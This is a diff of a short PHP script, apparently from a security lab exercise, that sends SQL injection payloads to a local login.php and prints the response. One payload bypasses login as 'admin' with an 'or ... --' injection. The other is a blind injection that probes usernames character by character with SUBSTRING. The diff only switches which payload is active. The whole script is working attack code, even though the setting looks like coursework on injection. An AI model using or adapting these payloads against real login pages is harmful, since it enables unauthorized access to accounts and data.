@@ -1,6 +1,6 @@
 <?php
-//$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
-$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%and%20SUBSTRING(username,1,1)%20=%20char(42)%20--%20";
+$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
+//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%and%20SUBSTRING(username,1,1)%20=%20char(42)%20--%20";
 $result = file_get_contents($url);
 
 print($result);
